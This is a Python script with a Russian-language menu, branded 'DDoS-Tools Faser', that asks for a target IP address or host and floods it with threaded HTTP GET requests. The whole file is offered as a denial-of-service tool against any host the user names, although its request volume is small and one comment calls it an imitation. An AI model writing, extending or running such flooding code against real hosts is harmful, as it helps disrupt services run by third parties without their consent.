import subprocess
import colorama  # Установи: pip install colorama
import requests  # Установи: pip install requests
import threading
import time

#  Цвета для вывода в консоль
colorama.init()
RED = colorama.Fore.RED
GREEN = colorama.Fore.GREEN
YELLOW = colorama.Fore.YELLOW
RESET = colorama.Style.RESET_ALL

def text():
    print(f"""
{YELLOW}████████████████████████████████████████████████████████████████████████████████
█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███
█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███
█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░████░░▄▀░░███
█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███
█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░█░░░░░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░░░███
█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█████████░░▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█████
█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░░░░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░░░░░█
█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█
█░░░░░░█████████░░░░░░██░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░░░█
████████████████████████████████████████████████████████████████████████████████{RESET}
    """)
    print(f"{GREEN}Добро пожаловать в DDoS-Tools Faser.{RESET}")
    print(f"{YELLOW}[1] DDoS-атака.{RESET}")
    print(f"{YELLOW}[2] Pro DDoS атака.{RESET}")
    print(f"{YELLOW}[3] Выход.{RESET}")


# Функция для имитации DDoS-атаки (отправка запросов)
def attack(ip_address, num_requests=100):
    try:
        for i in range(num_requests):
            try:
                response = requests.get(f"http://{ip_address}", timeout=5)  # Используем requests
                print(f"{GREEN}Запрос {i+1}/{num_requests} отправлен. Статус: {response.status_code}{RESET}")
            except requests.exceptions.RequestException as e:
                print(f"{RED}Ошибка при запросе {i+1}: {e}{RESET}")
            time.sleep(0.01) # Задержка между запросами (чтобы не перегружать свой сайт)
    except KeyboardInterrupt:
        print(f"{YELLOW}Атака прервана пользователем.{RESET}")

text()

while True:
    user_input1 = input(f"{YELLOW}Укажите раздел -> {RESET}")
    if user_input1 == "1":
        ip_address = input(f"{YELLOW}Укажите IP-адрес или Host для атаки -> {RESET}")
        if ip_address:
            num_threads = 5  # Количество потоков для отправки запросов
            threads = []
            for _ in range(num_threads):
                thread = threading.Thread(target=attack, args=(ip_address, 20)) # Отправляем 20 запросов в каждом потоке
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join() # Ждем завершения всех потоков
        else:
            print(f"{RED}IP-адрес не указан.{RESET}")
    elif user_input1 == "2":
        print(f"{YELLOW}Этот скрипт есть в файле!.{RESET}")
    elif user_input1 == "3":
        print(f"{YELLOW}Выход из программы.{RESET}")
        break # Выход из цикла
    else:
        print(f"{RED}Неверный ввод. Пожалуйста, выберите пункт меню.{RESET}")
